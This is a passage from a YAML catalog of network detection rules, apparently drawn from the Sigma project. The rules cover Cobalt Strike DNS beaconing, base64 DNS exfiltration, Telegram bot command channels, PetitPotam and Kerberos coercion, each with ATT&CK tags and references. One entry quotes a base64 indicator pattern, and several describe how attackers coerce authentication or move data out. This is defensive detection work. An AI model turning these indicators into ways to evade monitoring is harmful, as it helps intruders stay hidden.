  - T1074
  - T1105
  - T1560.001
  tags:
  - attack.collection
  - attack.lateral-movement
  - attack.command-and-control
  - attack.exfiltration
  - attack.t1074
  - attack.t1105
  - attack.t1560.001
  time_window: ''
  references: []
  false_positives:
  - Generally used to copy configs or IOS images
  notes: ''
- detection_id: b9e1f193-d236-4451-aaae-2f3d2102120d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_net_sniff.yml
  name: Cisco Sniffing
  description: Show when a monitor or a span/rspan is setup or modified
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.credential-access
  - attack.discovery
  - attack.t1040
  time_window: ''
  references: []
  false_positives:
  - Admins may setup new or modify old spans, or use a monitor for troubleshooting
  notes: ''
- detection_id: 56fa3cd6-f8d6-4520-a8c7-607292971886
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/bgp/cisco_bgp_md5_auth_failed.yml
  name: Cisco BGP Authentication Failures
  description: Detects BGP failures which may be indicative of brute force attacks
    to manipulate routing
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - repeated_or_escalation_behavior
  severity: low
  status: test
  platform: cisco
  product: bgp
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1078
  - T1110
  - T1557
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.credential-access
  - attack.collection
  - attack.t1078
  - attack.t1110
  - attack.t1557
  time_window: ''
  references:
  - https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-convery-franz-v3.pdf
  false_positives:
  - Unlikely. Except due to misconfigurations
  notes: ''
- detection_id: 50e606bf-04ce-4ca7-9d54-3449494bbd4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/ldp/cisco_ldp_md5_auth_failed.yml
  name: Cisco LDP Authentication Failures
  description: Detects LDP failures which may be indicative of brute force attacks
    to manipulate MPLS labels
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - repeated_or_escalation_behavior
  severity: low
  status: test
  platform: cisco
  product: ldp
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1078
  - T1110
  - T1557
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.credential-access
  - attack.collection
  - attack.t1078
  - attack.t1110
  - attack.t1557
  time_window: ''
  references:
  - https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-convery-franz-v3.pdf
  false_positives:
  - Unlikely. Except due to misconfigurations
  notes: ''
- detection_id: aff715fa-4dd5-497a-8db3-910bea555566
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/dns/net_dns_external_service_interaction_domains.yml
  name: DNS Query to External Service Interaction Domains
  description: 'Detects suspicious DNS queries to external service interaction domains
    often used for out-of-band interactions after successful RCE

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1190
  - T1595.002
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.reconnaissance
  - attack.t1595.002
  time_window: ''
  references:
  - https://twitter.com/breakersall/status/1533493587828260866
  - https://www.bitdefender.com/en-us/blog/businessinsights/bitdefender-advisory-critical-unauthenticated-rce-windows-server-update-services-cve-2025-59287
  - https://github.com/SigmaHQ/sigma/pull/5724#issuecomment-3466382234
  false_positives:
  - Legitimate security scanning.
  notes: ''
- detection_id: 2975af79-28c4-4d2f-a951-9095f229df29
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/dns/net_dns_mal_cobaltstrike.yml
  name: Cobalt Strike DNS Beaconing
  description: Detects suspicious DNS queries known from Cobalt Strike beacons
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  time_window: ''
  references:
  - https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns
  - https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b593fd50-7335-4682-a36c-4edcb68e4641
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/dns/net_dns_pua_cryptocoin_mining_xmr.yml
  name: Monero Crypto Coin Mining Pool Lookup
  description: Detects suspicious DNS queries to Monero mining pools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: stable
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics:
  - Exfiltration
  - Impact
  techniques:
  - T1496
  - T1567
  tags:
  - attack.impact
  - attack.t1496
  - attack.exfiltration
  - attack.t1567
  time_window: ''
  references:
  - https://www.nextron-systems.com/2021/10/24/monero-mining-pool-fqdns/
  false_positives:
  - Legitimate crypto coin mining
  notes: ''
- detection_id: 4153a907-2451-4e4f-a578-c52bb6881432
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/dns/net_dns_susp_b64_queries.yml
  name: Suspicious DNS Query with B64 Encoded String
  description: Detects suspicious DNS queries using base64 encoding
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  - T1071.004
  tags:
  - attack.exfiltration
  - attack.t1048.003
  - attack.command-and-control
  - attack.t1071.004
  time_window: ''
  references:
  - https://github.com/krmaxwell/dns-exfiltration
  false_positives:
  - Unknown
  notes: ''
- detection_id: c64c5175-5189-431b-a55e-6d9882158251
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/dns/net_dns_susp_telegram_api.yml
  name: Telegram Bot API Request
  description: Detects suspicious DNS queries to api.telegram.org used by Telegram
    Bots of any kind
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics: []
  techniques:
  - T1102.002
  tags:
  - attack.command-and-control
  - attack.t1102.002
  time_window: ''
  references:
  - https://core.telegram.org/bots/faq
  - https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/
  - https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/
  - https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/
  false_positives:
  - Legitimate use of Telegram bots in the company
  notes: ''
- detection_id: 8ae51330-899c-4641-8125-e39f2e07da72
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/dns/net_dns_susp_txt_exec_strings.yml
  name: DNS TXT Answer with Possible Execution Strings
  description: Detects strings used in command execution in DNS TXT Answer
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  time_window: ''
  references:
  - https://twitter.com/stvemillertime/status/1024707932447854592
  - https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Backdoors/DNS_TXT_Pwnage.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3eaf6218-3bed-4d8a-8707-274096f12a18
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/dns/net_dns_wannacry_killswitch_domain.yml
  name: Wannacry Killswitch Domain
  description: Detects wannacry killswitch domain dns queries
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/wannacry-ransomware-campaign
  false_positives:
  - Analyst testing
  notes: ''
- detection_id: d7fb8f0e-bd5f-45c2-b467-19571c490d7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/firewall/net_firewall_cleartext_protocols.yml
  name: Cleartext Protocol Usage
  description: 'Ensure that all account usernames and authentication credentials are
    transmitted across networks using encrypted channels.

    Ensure that an encryption is used for all sensitive information in transit. Ensure
    that an encrypted channels is used for all administrative account access.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: stable
  platform: ''
  product: ''
  category: firewall
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd0a4943-0edd-42cf-b50c-06f77a10d4c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/fortinet/fortigate/fortinet_fortigate_new_admin_account_created.yml
  name: FortiGate - New Administrator Account Created
  description: Detects the creation of an administrator account on a Fortinet FortiGate
    Firewall.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: fortigate
  product: event
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-24-535
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/398/event
  - https://docs.fortinet.com/document/fortigate/7.6.4/cli-reference/390485493/config-system-admin
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/44547/44547-logid-event-config-objattr
  false_positives:
  - An administrator account can be created for legitimate purposes. Investigate the
    account details to determine if it is authorized.
  notes: ''
- detection_id: 5c8d7b41-3812-432f-a0bb-4cfb7c31827e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/fortinet/fortigate/fortinet_fortigate_new_firewall_address_object.yml
  name: FortiGate - Firewall Address Object Added
  description: Detects the addition of firewall address objects on a Fortinet FortiGate
    Firewall.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: fortigate
  product: event
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-24-535
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/398/event
  - https://docs.fortinet.com/document/fortigate/7.6.4/cli-reference/306021697/config-firewall-address
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/44547/44547-logid-event-config-objattr
  false_positives:
  - An address could be added or deleted for legitimate purposes.
  notes: ''
- detection_id: f24ab7a8-f09a-4319-82c1-915586aa642b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/fortinet/fortigate/fortinet_fortigate_new_firewall_policy_added.yml
  name: FortiGate - New Firewall Policy Added
  description: Detects the addition of a new firewall policy on a Fortinet FortiGate
    Firewall.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: fortigate
  product: event
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-24-535
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/398/event
  - https://docs.fortinet.com/document/fortigate/7.6.4/cli-reference/333889629/config-firewall-policy
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/44547/44547-logid-event-config-objattr
  false_positives:
  - A firewall policy can be added for legitimate purposes.
  notes: ''
- detection_id: ddbbe845-1d74-43a8-8231-2156d180234d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/fortinet/fortigate/fortinet_fortigate_new_local_user_created.yml
  name: FortiGate - New Local User Created
  description: 'Detects the creation of a new local user on a Fortinet FortiGate Firewall.

    The new local user could be used for VPN connections.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: fortigate
  product: event
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-24-535
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/398/event
  - https://docs.fortinet.com/document/fortigate/7.6.4/cli-reference/109120963/config-user-local
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/44547/44547-logid-event-config-objattr
  false_positives:
  - A local user can be created for legitimate purposes. Investigate the user details
    to determine if it is authorized.
  notes: ''
- detection_id: 2bfb6216-0c31-4d20-8501-2629b29a3fa2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/fortinet/fortigate/fortinet_fortigate_new_vpn_ssl_web_portal.yml
  name: FortiGate - New VPN SSL Web Portal Added
  description: 'Detects the addition of a VPN SSL Web Portal on a Fortinet FortiGate
    Firewall.

    This behavior was observed in pair with modification of VPN SSL settings.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: fortigate
  product: event
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-24-535
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/398/event
  - https://docs.fortinet.com/document/fortigate/7.6.4/cli-reference/113121765/config-vpn-ssl-web-portal
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/44547/44547-logid-event-config-objattr
  false_positives:
  - A VPN SSL Web Portal can be added for legitimate purposes.
  notes: ''
- detection_id: 69ffc84e-8b1a-4024-8351-e018f66b8275
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/fortinet/fortigate/fortinet_fortigate_user_group_modified.yml
  name: FortiGate - User Group Modified
  description: 'Detects the modification of a user group on a Fortinet FortiGate Firewall.

    The group could be used to grant VPN access to a network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: fortigate
  product: event
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-24-535
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/398/event
  - https://docs.fortinet.com/document/fortigate/7.6.4/cli-reference/328136827/config-user-group
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/44547/44547-logid-event-config-objattr
  false_positives:
  - A group can be modified for legitimate purposes.
  notes: ''
- detection_id: 8b5dacf2-aeb7-459d-b133-678eb696d410
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/fortinet/fortigate/fortinet_fortigate_vpn_ssl_settings_modified.yml
  name: FortiGate - VPN SSL Settings Modified
  description: 'Detects the modification of VPN SSL Settings (for example, the modification
    of authentication rules).

    This behavior was observed in pair with the addition of a VPN SSL Web Portal.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: experimental
  platform: fortigate
  product: event
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-24-535
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/398/event
  - https://docs.fortinet.com/document/fortigate/7.6.4/cli-reference/114404382/config-vpn-ssl-settings
  - https://docs.fortinet.com/document/fortigate/7.6.4/fortios-log-message-reference/44546/44546-logid-event-config-attr
  false_positives:
  - VPN SSL settings can be changed for legitimate purposes.
  notes: ''
- detection_id: a557ffe6-ac54-43d2-ae69-158027082350
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/huawei/bgp/huawei_bgp_auth_failed.yml
  name: Huawei BGP Authentication Failures
  description: Detects BGP failures which may be indicative of brute force attacks
    to manipulate routing.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - repeated_or_escalation_behavior
  severity: low
  status: test
  platform: huawei
  product: bgp
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1078
  - T1110
  - T1557
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.credential-access
  - attack.collection
  - attack.t1078
  - attack.t1110
  - attack.t1557
  time_window: ''
  references:
  - https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-convery-franz-v3.pdf
  false_positives:
  - Unlikely. Except due to misconfigurations
  notes: ''
- detection_id: a7c0ae48-8df8-42bf-91bd-2ea57e2f9d43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/juniper/bgp/juniper_bgp_missing_md5.yml
  name: Juniper BGP Missing MD5
  description: Detects juniper BGP missing MD5 digest. Which may be indicative of
    brute force attacks to manipulate routing.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - repeated_or_escalation_behavior
  severity: low
  status: test
  platform: juniper
  product: bgp
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1078
  - T1110
  - T1557
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.credential-access
  - attack.collection
  - attack.t1078
  - attack.t1110
  - attack.t1557
  time_window: ''
  references:
  - https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-convery-franz-v3.pdf
  false_positives:
  - Unlikely. Except due to misconfigurations
  notes: ''
- detection_id: b640c0b8-87f8-4daa-aef8-95a24261dd1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dce_rpc_mitre_bzar_execution.yml
  name: MITRE BZAR Indicators for Execution
  description: Windows DCE-RPC functions which indicate an execution techniques on
    the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation
    field goes to MITRE
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: zeek
  product: dce_rpc
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1053.002
  - T1569.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1047
  - attack.t1053.002
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/mitre-attack/bzar#indicators-for-attck-execution
  false_positives:
  - Windows administrator tasks or troubleshooting
  - Windows management scripts or software
  notes: ''
- detection_id: 53389db6-ba46-48e3-a94c-e0f2cefe1583
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dce_rpc_mitre_bzar_persistence.yml
  name: MITRE BZAR Indicators for Persistence
  description: Windows DCE-RPC functions which indicate a persistence techniques on
    the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation
    field goes to MITRE.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: zeek
  product: dce_rpc
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.004
  time_window: ''
  references:
  - https://github.com/mitre-attack/bzar#indicators-for-attck-persistence
  false_positives:
  - Windows administrator tasks or troubleshooting
  - Windows management scripts or software
  notes: ''
- detection_id: 4096842a-8f9f-4d36-92b4-d0b2a62f9b2a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dce_rpc_potential_petit_potam_efs_rpc_call.yml
  name: Potential PetitPotam Attack Via EFS RPC Calls
  description: "Detects usage of the windows RPC library Encrypting File System Remote\
    \ Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed\
    \ to as PetitPotam.\nThe usage of this RPC function should be rare if ever used\
    \ at all.\nThus usage of this function is uncommon enough that any usage of this\
    \ RPC function should warrant further investigation to determine if it is legitimate.\n\
    \ View surrounding logs (within a few minutes before and after) from the Source\
    \ IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files,\
    \ rdp, ntlm, kerberos, etc..'\n"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: zeek
  product: dce_rpc
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1187
  - T1557.001
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1557.001
  - attack.t1187
  time_window: ''
  references:
  - https://github.com/topotam/PetitPotam/blob/d83ac8f2dd34654628c17490f99106eb128e7d1e/PetitPotam/PetitPotam.cpp
  - https://msrc.microsoft.com/update-guide/vulnerability/ADV210003
  - https://vx-underground.org/archive/Symantec/windows-vista-network-attack-07-en.pdf
  - https://threatpost.com/microsoft-petitpotam-poc/168163/
  false_positives:
  - Uncommon but legitimate windows administrator or software tasks that make use
    of the Encrypting File System RPC Calls. Verify if this is common activity (see
    description).
  notes: ''
- detection_id: bae2865c-5565-470d-b505-9496c87d0c30
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dce_rpc_smb_spoolss_named_pipe.yml
  name: SMB Spoolss Name Piped Usage
  description: Detects the use of the spoolss named pipe over SMB. This can be used
    to trigger the authentication via NTLM of any machine that has the spoolservice
    enabled.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: zeek
  product: smb_files
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
  - https://dirkjanm.io/a-different-way-of-abusing-zerologon/
  - https://twitter.com/_dirkjan/status/1309214379003588608
  false_positives:
  - Domain Controllers that are sometimes, commonly although should not be, acting
    as printer servers too
  notes: ''
- detection_id: 7100f7e3-92ce-4584-b7b7-01b40d3d4118
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_default_cobalt_strike_certificate.yml
  name: Default Cobalt Strike Certificate
  description: Detects the presence of default Cobalt Strike certificate in the HTTPS
    traffic
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: zeek
  product: x509
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - attack.s0154
  time_window: ''
  references:
  - https://sergiusechel.medium.com/improving-the-network-based-detection-of-cobalt-strike-c2-servers-in-the-wild-while-reducing-the-6964205f6468
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5588576c-5898-4fac-bcdd-7475a60e8f43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dns_kerberos_coercion_via_dns_object_spn_spoofing.yml
  name: Suspicious DNS Query Indicating Kerberos Coercion via DNS Object SPN Spoofing
    - Network
  description: 'Detects DNS queries containing patterns associated with Kerberos coercion
    attacks via DNS object spoofing.

    The pattern "1UWhRCAAAAA..BAAAA" is a base64-encoded signature that corresponds
    to a marshaled CREDENTIAL_TARGET_INFORMATION structure.

    Attackers can use this technique to coerce authentication from victim systems
    to attacker-controlled hosts.

    It is one of the strong indicators of a Kerberos coercion attack, where adversaries
    manipulate DNS records

    to spoof Service Principal Names (SPNs) and redirect authentication requests like
    CVE-2025-33073.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: experimental
  platform: zeek
  product: dns
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1187
  - T1557.001
  tags:
  - attack.collection
  - attack.credential-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1557.001
  - attack.t1187
  time_window: ''
  references:
  - https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
  - https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: bf74135c-18e8-4a72-a926-0e4f47888c19
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dns_mining_pools.yml
  name: DNS Events Related To Mining Pools
  description: Identifies clients that may be performing DNS lookups associated with
    common currency mining pools.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: low
  status: test
  platform: zeek
  product: dns
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Impact
  techniques:
  - T1496
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.impact
  - attack.t1496
  time_window: ''
  references:
  - https://github.com/Azure/Azure-Sentinel/blob/fa0411f9424b6c47b4d5a20165e4f1b168c1f103/Detections/ASimDNS/imDNS_Miners.yaml
  false_positives:
  - A DNS lookup does not necessarily  mean a successful attempt, verify a) if there
    was a response using the zeek answers field, if there was then verify the connections
    (conn.log) to those IPs. b) verify if HTTP, SSL, or TLS activity to the domain
    that was queried. http.log field is 'host' and ssl/tls is 'server_name'.
  notes: ''
- detection_id: fa7703d6-0ee8-4949-889c-48c84bc15b6f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dns_nkn.yml
  name: New Kind of Network (NKN) Detection
  description: NKN is a networking service using blockchain technology to support
    a decentralized network of peers. While there are legitimate uses for it, it can
    also be used as a C2 channel. This rule looks for a DNS request to the ma>
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: zeek
  product: dns
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - https://github.com/nknorg/nkn-sdk-go
  - https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/
  - https://github.com/Maka8ka/NGLite
  false_positives:
  - Unknown
  notes: ''
- detection_id: ede05abc-2c9e-4624-9944-9ff17fdc0bf5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dns_susp_zbit_flag.yml
  name: Suspicious DNS Z Flag Bit Set
  description: 'The DNS Z flag is bit within the DNS protocol header that is, per
    the IETF design, meant to be used reserved (unused).

    Although recently it has been used in DNSSec, the value being set to anything
    other than 0 should be rare.

    Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate
    domains is low effort and high reward.

    Determine if multiple of these files were accessed in a short period of time to
    further enhance the possibility of seeing if this was a one off or the possibility
    of larger sensitive file gathering.

    This Sigma query is designed to accompany the Corelight Threat Hunting Guide,
    which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs''

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: zeek
  product: dns
  category: ''
